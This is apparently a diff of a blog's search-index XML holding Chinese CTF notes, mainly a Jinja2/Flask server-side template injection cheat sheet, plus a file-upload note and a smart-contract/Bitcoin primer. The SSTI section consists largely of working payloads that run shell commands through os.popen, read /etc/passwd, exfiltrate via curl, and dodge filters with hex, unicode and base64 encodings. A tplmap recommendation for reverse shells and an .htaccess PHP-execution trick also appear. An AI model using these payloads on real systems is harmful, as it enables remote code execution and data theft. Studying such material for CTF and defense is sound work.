-&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()</code></pre>
-
-<p><strong>###</strong> <strong>总结一下其实思路有以下几种</strong></p>
-<p>1).通过文件读取的命令来注入，例如**&lt;class ‘_frozen_importlib_external.FileLoader’&gt;**这种</p>
-<p>2).利用os方法(拿到一个os开头的class就可以)来执行系统命令，达到cat flag的需求</p>
-<ul>
-<li><p>一般按基类开跑的是要拿builtins的方法</p>
-</li>
-<li><p>也可以使用config方法**<code>config.class.init[&#39;glo&#39;+&#39;bals&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()</code>**或者其他flask内置的函数</p>
-</li>
-</ul>
-<p> <strong>一些绕waf的姿势：</strong></p>
-<p><strong>过滤[</strong></p>
-<pre><code class="highlight plaintext">#getitem、pop
-&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read()
-&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read()</code></pre>
-
-<p><strong>过滤引号</strong></p>
-<pre><code class="highlight plaintext">#chr函数
-&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
-&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;
-#request对象
-&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd
-#命令执行
-&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;
-&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;
-&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id
-#request 绕过
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd    
-\#分析：
-request.args 是flask中的一个属性,为返回请求的参数,这里把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。
-若args被过滤了，还可以使用values来接受GET或者POST参数。：
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;
-Cookie:arg1=open;arg2=/etc/passwd
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;
-post:arg1=open&amp;arg2=/etc/passwd</code></pre>
-
-<p><strong>过滤下划线</strong></p>
-<pre><code class="highlight plaintext">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//request.args.xx就能直接查询对应的参数值，把原参数换成[request.args.xx]即可</code></pre>
-
-<p><strong>过滤花括号</strong></p>
-<pre><code class="highlight plaintext">#用&#123;%%&#125;标记
-&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</code></pre>
-
-<p><strong>过滤关键字</strong></p>
-<ul>
-<li>利用内置的语法传参的值：</li>
-</ul>
-<p>如<code>request.args.[变量名](get传参) request.cookies.[变量名](cookies传参)</code></p>
-<ul>
-<li>使用切片将逆置的关键字顺序输出，进而达到绕过。</li>
-</ul>
-<pre><code class="highlight plaintext">&quot;&quot;[&quot;__cla&quot;&quot;ss__&quot;]
-&quot;&quot;.__getattribute__(&quot;__cla&quot;&quot;ss__&quot;)</code></pre>
-
-<ul>
-<li>反转</li>
-</ul>
-<pre><code class="highlight plaintext">&quot;&quot;[&quot;__ssalc__&quot;][::-1]
-&quot;&quot;.__getattribute__(&quot;__ssalc__&quot;[::-1])</code></pre>
-
-<ul>
-<li>利用”+”进行字符串拼接，绕过关键字过滤。</li>
-</ul>
-<pre><code class="highlight plaintext">&#123;&#123;()[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&quot;__im&quot;+&quot;port__(&#x27;o&#x27;+&#x27;s&#x27;).po&quot;&quot;pen(&#x27;whoami&#x27;).read()&quot;)&#125;&#125;
-[][%27__cla%27+%27ss__%27][%27__ba%27+%27se__%27][%27__subcl%27+%27asses__%27]()[117][&quot;__in&quot;+&quot;it__&quot;][&quot;__glo&quot;+&quot;bals__&quot;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()</code></pre>
-
-<ul>
-<li>join拼接</li>
-</ul>
-<p>利用join（）函数绕过关键字过滤</p>
-<pre><code class="highlight plaintext">&#123;&#123;[].__class__.__base__.__subclasses__()[40](&quot;fla&quot;.join(&quot;/g&quot;)).read()&#125;&#125;</code></pre>
-
-<ul>
-<li>利用引号绕过</li>
-</ul>
-<pre><code class="highlight plaintext">[&#123;&#123;[].__class__.__base__.__subclasses__()40&quot;/fl&quot;&quot;ag&quot;.read()&#125;&#125;]()</code></pre>
-
-<ul>
-<li>使用str原生函数replace替换</li>
-</ul>
-<p>将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。</p>
-<pre><code class="highlight plaintext">&#123;&#123;().__getattribute__(&#x27;__claAss__&#x27;.replace(&quot;A&quot;,&quot;&quot;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;&#125;</code></pre>
-
-<ul>
-<li>ascii转换</li>
-</ul>
-<pre><code class="highlight plaintext">将每一个字符都转换为ascii值后再拼接在一起。
-
-&quot;&#123;0:c&#125;&quot;.format(97)=&#x27;a&#x27;
-&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;.format(95,95,99,108,97,115,115,95,95)=&#x27;__class__&#x27;</code></pre>
-
-<ul>
-<li>16进制编码绕过</li>
-</ul>
-<pre><code class="highlight plaintext">&quot;__class__&quot;==&quot;\x5f\x5fclass\x5f\x5f&quot;==&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;
-
-例子：
-&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#x27;](&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;
-\
-同理，也可使用八进制编码绕过</code></pre>
-
-<ul>
-<li><p>base64编码绕过</p>
-<p>对于python2，可利用base64进行绕过，对于python3没有decode方法，不能使用该方法进行绕过。</p>
-</li>
-</ul>
-<pre><code class="highlight plaintext">&quot;__class__&quot;==(&quot;X19jbGFzc19f&quot;).decode(&quot;base64&quot;)</code></pre>
-
-<p>例子：</p>
-<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;X19idWlsdGluc19f&#x27;.decode(&#x27;base64&#x27;)][&#x27;ZXZhbA==&#x27;.decode(&#x27;base64&#x27;)](&#x27;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#x27;.decode(&#x27;base64&#x27;))&#125;&#125;  
-等价于  
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;</code></pre>
-
-<ul>
-<li>unicode编码绕过</li>
-</ul>
-<pre><code class="highlight plaintext">&#123;%print((((lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;os&quot;))|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&quot;))|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;
-等同于lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;tac /f*&#x27;).read()</code></pre>
-
-<ul>
-<li>Hex编码绕过</li>
-</ul>
-<pre><code class="highlight plaintext">[&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;][&#x27;\x65\x76\x61\x6c&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;]()
-
-&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;\x6f\x73&#x27;].popen(&#x27;\x6c\x73\x20\x2f&#x27;).read()&#125;&#125;   
-等价于   
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;
-
-&#123;&#123;().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</code></pre>
-
-<ul>
-<li>绕过init<br>可以用<code>__enter__</code>或<code>__exit__</code>替代<code>__init__</code></li>
-</ul>
-<pre><code class="highlight plaintext">&#123;().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
-
-<pre><code class="highlight plaintext">&#123;&#123;().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#x27;__builtins__&#x27;][&#x27;open&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</code></pre>
-
-<p><strong>利用示例：</strong></p>
-<pre><code class="highlight plaintext">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;
-&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;
-  &#123;% for b in c.__init__.__globals__.values() %&#125;
-  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;
-    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;
-      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125;         //popen的参数就是要执行的命令
-    &#123;% endif %&#125;
-  &#123;% endif %&#125;
-  &#123;% endfor %&#125;
-&#123;% endif %&#125;
-&#123;% endfor %&#125;</code></pre>
-
-<p>这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p>
-<p>github地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903230151729-80521204.png" alt="img"></a></p>
-<p>一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测</p>
-<h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p>
-<p>以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的”FOO”，在进行加载模板并输出，且未对name值进行安全检查输入情况。</p>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -2751,7 +2587,7 @@ if __name__ == &quot;__main__&quot;:
   <entry>
     <title>python的RCE姿势以及内存马注入</title>
     <url>/2025/03/25/python%E7%9A%84RCE%E5%A7%BF%E5%8A%BF%E4%BB%A5%E5%8F%8A%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="python的rce姿势以及内存马注入"><a href="#python的rce姿势以及内存马注入" class="headerlink" title="python的rce姿势以及内存马注入"></a>python的rce姿势以及内存马注入</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
+    <content><![CDATA[<h1 id="python的rce姿势以及内存马注入-未补完"><a href="#python的rce姿势以及内存马注入-未补完" class="headerlink" title="python的rce姿势以及内存马注入(未补完)"></a>python的rce姿势以及内存马注入(未补完)</h1><p>python的SSTI是明白的，可是如果是先渲染再接受参数呢?只传参不渲染又该如何面对呢</p>
 <p>诶，注入一个内存马试试.?</p>
 <h2 id="Python-的命令执行"><a href="#Python-的命令执行" class="headerlink" title="Python 的命令执行"></a>Python 的命令执行</h2><p>不同于php自带的命令执行函数，python是要先引入模块的，参考jinja2模板注入找os内置函数的那个过程</p>
 <h3 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h3><p>经典款:</p>
@@ -2936,6 +2772,21 @@ setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
 ]]></content>
       <tags>
         <tag>-Web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
+<p>弱判断:bp改一下就能过</p>
+<p>增加文件头</p>
+<p>改phtml绕过</p>
+<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
+<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
+<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -3215,136 +3066,6 @@ str:截取的字符串   <span class="keyword">start</span>:起始位置   lengt
 ]]></content>
       <tags>
         <tag>-web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
-<p>弱判断:bp改一下就能过</p>
-<p>增加文件头</p>
-<p>改phtml绕过</p>
-<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
-<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
-<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-]]></content>
-      <tags>
-        <tag>-CTF -Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>智能合约深度学习（持续施工ing）</title>
-    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
-    <content><![CDATA[<blockquote>
-<h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote>
-<h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote>
-<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
-</blockquote>
-<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
-<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
-<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
-<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
-<h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
-<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>
-
-<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
-<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
-<p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
-<h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
-<h2 id="比特币的交易"><a href="#比特币的交易" class="headerlink" title="比特币的交易"></a>比特币的交易</h2><p>交易包括两个方向，Input以及Output.</p>
-<p>两者可以不完全一致，但只能输入略大于输出，那么缺少的这部分去哪里了呢 ，是支付给了矿工哦，每笔交易在发布后可以选择支付交易费用，钱到位交易也会更快被打包。但是不代表不支付或支付很少交易费用不会有人处理你的交易，只是会被推迟，总之，不管是否支付交易费用，矿工都会获得比特币的奖励，你可以将其理解为：<strong>即使你不付给服务员小费，但并不影响他获得工资</strong>。</p>
-<h2 id="比特币的交易加密"><a href="#比特币的交易加密" class="headerlink" title="比特币的交易加密"></a>比特币的交易加密</h2><p>对于每个用户的钱包，都由三部分组成</p>
-<p><strong>16位的地址，公钥，私钥(256位)</strong></p>
-<p>假设在A与B交易，A发送给B一条A的私钥加密过的内容，那么若B没有A的公钥，B就无法解密内容</p>
-<p>公钥的产生依赖于私钥，而钱包的地址生成依赖于公钥</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/65e01b2554c3850eeeebb60eb7c4b93b.jpeg" alt="img"></p>
-<p>贴一条其他师傅的说明过程。</p>
-<p>第一步：生成随机私钥</p>
-<p>私钥是一个随机数，随机选取一个32字节的数，这个数的范围大小是介于1 ~ 0xFFFF FFFF FFFF FFFF FFFF FFFF FFFF FFFE BAAE DCE6 AF48 A03B BFD2 5E8C D036 4141之间的一个数，为了方便后面的计算，我们随机生成一个合法的私钥：</p>
-<p>8F72F6B29E6E225A36B68DFE333C7CE5E55D83249D3D2CD6332671FA445C4DD3</p>
-<p>第二步：椭圆曲线算公钥</p>
-<p>生成了私钥之后，我们使用椭圆曲线加密算法（ECDSA-secp256k1）计算私钥所对应的非压缩公钥，生成的公钥共65字节， 其中一个字节是0x04，其中32个字节是X坐标，另外32个字节是Y坐标：</p>
-<p>公钥P.X：<br>06CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385</p>
-<p>公钥P.Y：<br>FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
-<p>第三步：计算公钥的SHA-256哈希值</p>
-<p>将上述公钥地址拼合，得到标准地址：<br>0406CCAE7536386DA2C5ADD428B099C7658814CA837F94FADE365D0EC6B1519385FF83EC5F2C0C8F016A32134589F7B9E97ACBFEFD2EF12A91FA622B38A1449EEB</p>
-<p>对齐进行SHA-256哈希计算，得到结果：<br>2572e5f4a8e77ddf5bb35b9e61c61f66455a4a24bcfd6cb190a8e8ff48fc097d</p>
-<p>第四步：计算 RIPEMD-160哈希值</p>
-<p>取上一步结果，进行RIPEMD-160计算，得到结果：</p>
-<p>0b14f003d63ab31aef5fedde2b504699547dd1f6</p>
-<p>第五步：加入地址版本号（比特币主网版本号“0x00”）</p>
-<p>取上一步结果，在前面加上16进制的00，即：</p>
-<p>000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
-<p>第六步：计算 SHA-256 哈希值</p>
-<p>取上一步结果，进行SHA-256计算，可得：</p>
-<p>ddc2270f93cc84cc6869dd373f3c340bbf5cb9a8f5559297cc9e5d947aab2536</p>
-<p>然后，对以上结果再次计算 SHA-256 哈希值，得到：</p>
-<p>869ac57b83ccf75ca9da8895823562fffb611e3c297d9c2d4612aeeb32850078</p>
-<p>第七步：取上一步结果的前4个字节（8位十六进制）</p>
-<p>869ac57b</p>
-<p>第八步：把这4个字节加在第五步的结果后面</p>
-<p>作为校验位，将这4个字节加载第五步的结果后面，这就是比特币地址的16进制形态了：</p>
-<p>869ac57b000b14f003d63ab31aef5fedde2b504699547dd1f6</p>
-<p>第九步：用Base58编码变换一下地址</p>
-<p>对上一步的结果进行Base58编码，得到：</p>
-<p>1QCXRuoxWo5Bya9NxHaVBArBQYhatHJrU7</p>
-<p>这就是我们经常看到的传统意义上的比特币钱包地址</p>
-<h1 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h1><p>智能合约的开发，主要使用Solidity编译语言以及在线的Remix编译器</p>
-<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="整数"><a href="#整数" class="headerlink" title="整数"></a>整数</h3><p>有符号整数类型包括int8、int16、int32、int64等，而无符号整数类型包括uint8、uint16、uint32、uint64等。这些类型表示不同位数的整数。</p>
-<p>相较于C语言，保留了大部分运算，增加了乘方(**)运算以及更改了”&lt;&lt;””&gt;&gt;”的运算规则</p>
-<pre><code class="highlight plaintext">x&lt;&lt;y  相当于x*2**y   x&gt;&gt;y相当于x/2**y</code></pre>
-
-
-
-<h3 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h3><p>即bool类型，会在内置函数中大量出现，默认值为false</p>
-<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>用<strong>address</strong>来声明，长度为20位，表示以太坊网络上的账户地址</p>
-<p>在地址型下有**transfer(转账)<strong>与</strong>balance(账户)**两个变量</p>
-<p>通过以下函数来处理地址类型（关于Gas的概念，请见<strong>交易处理</strong>板块）</p>
-<pre><code class="highlight plaintext">&lt;address&gt;.balance(uint 256) ——&gt;返回以wei为单位的该地址的以太币账户（1ETH=10^18wei）</code></pre>
-
-<pre><code class="highlight plaintext">&lt;address&gt;.transfer(uint 256 amount) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）</code></pre>
-
-<p>余额不足，Gas不足时会使合约无法执行，回滚已执行的程序并且发送异常信息（<strong>交易被终止</strong>）</p>
-<pre><code class="highlight plaintext">&lt;address&gt;.send(uint 256 amount) returns (bool) ——&gt; 给某地址转入指定数量的以太币（每次转账需要2300的Gas费用，且费用固定）在交易成功或失败后会返回对应的bool值</code></pre>
-
-<p>余额不足，Gas不足时会终止程序但不会发送异常消息，会返回False</p>
-<p>但使用.send是存在一定风险的，可能会导致转账失败(调用的堆栈&gt;1024KB或发出方的Gas耗尽)的情况下交易的对方仍能收到以太币</p>
-<pre><code class="highlight plaintext">&lt;address&gt;.call(...) returns (bool) ——&gt;最常用的调用函数，失败返回false,Gas的费用可自己调整。</code></pre>
-
-<p>发布低级别的调用</p>
-<p>call()下有两个控制交易的内置函数</p>
-<p>gas()(支付的Gas值)与value()(支付的以太币值)，两者同时调用没有先后顺序的要求</p>
-<pre><code class="highlight plaintext">例如：address.call.gas(100000).value(1 ether)(&quot;register&quot;,&quot;Myname&quot;)</code></pre>
-
-
-
-<pre><code class="highlight plaintext">&lt;address&gt;.callcode(...) returns (bool)</code></pre>
-
-<p>发布低级别的调用，没call好用，不久就会被删除了</p>
-<pre><code class="highlight plaintext">&lt;address&gt; .delegatecall(...) returns (bool)</code></pre>
-
-<p>发布低级别的代表调用,调用的是储存在另一个库中的库代码(Library code)</p>
-<p>？故使用前要确定两个合约的储存设计都要适用于该函数？</p>
-<blockquote>
-<p>[!WARNING]</p>
-<p><code>call()</code> <code>callcode()</code> <code>delegatecall()</code>都是低阶函数，使用时调用的未知合约可能是恶意合约，在调用是可能会被篡权，反过来被调用合约，因此调用函数返回时要注意原合约的参数是否已经被改变</p>
-</blockquote>
-<blockquote>
-<p>地址常量</p>
-</blockquote>
-<p>​	</p>
-<h3 id="字节数组"><a href="#字节数组" class="headerlink" title="字节数组"></a>字节数组</h3><p>分为<strong>固定长度的字节数组</strong>以及<strong>可变长度的字节数组</strong></p>
-<p>固定长度的数组可以用bytes1~bytes32来说明(bytes1也可以直接记作byte)</p>
-<p>可以通过索引访问以及[变量名].length返回字节长度</p>
-<p>可变长度的数组：</p>
-<p>①bytes(与array性质相同)</p>
-<p>②string(可以理解为特殊的数组)，不可以调用.length&#x2F;索引来访问</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>智能合约</tag>
       </tags>
   </entry>
   <entry>
@@ -3934,6 +3655,121 @@ conversions = &#123;
 <h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
       <tags>
         <tag>CTF Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>智能合约深度学习（持续施工ing）</title>
+    <url>/2024/12/22/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%96%BD%E5%B7%A5ing%EF%BC%89/</url>
+    <content><![CDATA[<blockquote>
+<h1 id="智能合约深度学习"><a href="#智能合约深度学习" class="headerlink" title="智能合约深度学习"></a>智能合约深度学习</h1></blockquote>
+<h1 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h1><blockquote>
+<p><strong>如果想直接入手合约，可以直接跳至合约开发模块哦</strong></p>
+</blockquote>
+<p>在进入智能合约学习环节之前，让我们先了解一下它的“爹”，即<strong>区块链</strong></p>
+<p>区块链，是一种区中心化，点对点系统的工具，也可以说是一种数据库系统（实际上就是一本记录各种交易的账本）</p>
+<p>区别于传统的中心化系统，这个系统由各个区块（前区块的加密哈希，时间戳，交易数据）组成，在这个系统中，由网络中的大多数节点来决定新区块中交易记录的录入以及修改。这就使得其安全性远远超过了传统的系统。假设一个用户想要伪造一份交易，那么从理论来说他需要修改全网每个节点的总账，这个过程需要消耗巨量的算力<del>有这算力谁还来伪造交易啊</del>，每增加一个区块，需要全网51%以上的节点的认可才能够组成区块链</p>
+<p>那么我们现在更具体一点，来谈一个家喻户晓的区块链系统———比特币系统</p>
+<h1 id="关于比特币系统"><a href="#关于比特币系统" class="headerlink" title="关于比特币系统"></a>关于比特币系统</h1><h2 id="竞争记账"><a href="#竞争记账" class="headerlink" title="竞争记账"></a>竞争记账</h2><p>即挖矿，在一个区块建立之后，竞争记账的节点需要计算建立以来所有交易的哈希值（<strong>SHA256</strong>），再将其两两组合，不断重复，最终得到一个SHA256值（也叫<strong>默克根</strong>），最后需要进行以下计算</p>
+<pre><code class="highlight plaintext">SHA256(默克根+前一区的ID+一个随机数)</code></pre>
+
+<p>通常这个值要满足哈希值的前20位为0(达成概率在百万分之一水平),也就是算力比拼</p>
+<p>成功者向全网发送通知，若经过检验大家就公认他构造的这个区块并以其作为父区块，进行下一个区块的算力竞争（每10分钟进行一次）</p>
+<p>成功者会获得12.5个比特币<del>122w美刀(2024.12.9日汇率)</del>作为奖励，这就是中本聪设计的激励机制<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/e23cc007503b1060aa2f3f307de43b14.png" alt="img"></p>
+<h2 id="长链与短链"><a href="#长链与短链" class="headerlink" title="长链与短链"></a>长链与短链</h2><p>又是算力竞争……在向全网通知时（假设你的答案正确），可能会有人与你在相同的时间发送了正确的答案，于是会出现两条链，那么就又到了拼算力的时候了，不同的矿工会选择不同的链继续下一轮区块计算，这里就不得不提另一种机制了，即<strong>总是选择工作量最大的链</strong>，于是哪条链先出现下一个区块，也就意味着会有更多的矿工选择这条链工作，那么另一条短链就会被废止。组装短链的矿工也得不到比特币奖励，结果就是区块链只有唯一一条主线。</p>
